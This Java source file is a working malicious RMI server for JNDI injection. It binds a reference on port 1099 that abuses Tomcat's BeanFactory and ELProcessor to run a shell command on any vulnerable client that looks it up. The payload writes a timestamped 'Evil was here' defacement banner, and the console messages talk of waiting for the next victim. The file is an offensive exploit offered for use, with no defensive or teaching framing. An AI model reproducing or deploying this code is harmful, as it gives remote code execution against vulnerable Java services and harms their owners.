package com.evil.rmi;

import java.io.*;
import java.lang.*;
import java.util.*;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
 
import java.text.DateFormat;  
import java.text.SimpleDateFormat;  
import java.util.Date;  
import java.util.Calendar;  

public class RmiServer {
    private ReferenceWrapper evilRmi() throws IOException, RemoteException, NamingException {
	 String[] Hacked = {	
             " ██████████              ███  ████                                          █████ "                                   
           , "░░███░░░░░█             ░░░  ░░███                                         ░░███               "                             
           , " ░███  █ ░  █████ █████ ████  ░███     █████ ███ █████  ██████    █████     ░███████    ██████  ████████   ██████  "         
           , " ░██████   ░░███ ░░███ ░░███  ░███    ░░███ ░███░░███  ░░░░░███  ███░░      ░███░░███  ███░░███░░███░░███ ███░░███ "        
           , " ░███░░█    ░███  ░███  ░███  ░███     ░███ ░███ ░███   ███████ ░░█████     ░███ ░███ ░███████  ░███ ░░░ ░███████  "         
           , " ░███ ░   █ ░░███ ███   ░███  ░███     ░░███████████   ███░░███  ░░░░███    ░███ ░███ ░███░░░   ░███     ░███░░░   "         
           , " ██████████  ░░█████    █████ █████     ░░████░████   ░░████████ ██████     ████ █████░░██████  █████    ░░██████  ██ ██ ██ "
           , "░░░░░░░░░░    ░░░░░    ░░░░░ ░░░░░       ░░░░ ░░░░     ░░░░░░░░ ░░░░░░     ░░░░ ░░░░░  ░░░░░░  ░░░░░      ░░░░░░  ░░ ░░ ░░ "
           };

        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd 'at' HH:mm:ss z");
        Date date = new Date(System.currentTimeMillis()); 

        String strDate = dateFormat.format(date);  

	ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        
        String hackStr = "";
        hackStr += "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(";
        hackStr += "\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"/bin/sh\\\",\\\"-c\\\",\\\"";

        hackStr += "echo 'Hacked on: "+strDate+"' >Banner;";	
        for (int i=0; i<Hacked.length; i++) {
            hackStr += "echo '"+Hacked[i]+"' >>Banner;";	
        }
        hackStr += "\\\"]).start()\")";

	ref.add(new StringRefAddr("x", hackStr));
        return new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
    }

    public static void main(String[] args) throws Exception {
        System.getProperties().put("java.rmi.server.logCalls","true");

        System.out.println("Creating evil RMI registry on port 1099");
        Registry registry = LocateRegistry.createRegistry(1099);

        RmiServer rmiServer = new RmiServer();
        System.out.println("Evil: hehe, waiting for my next victim...");
        registry.bind("EvilRmi", rmiServer.evilRmi());
    }
}


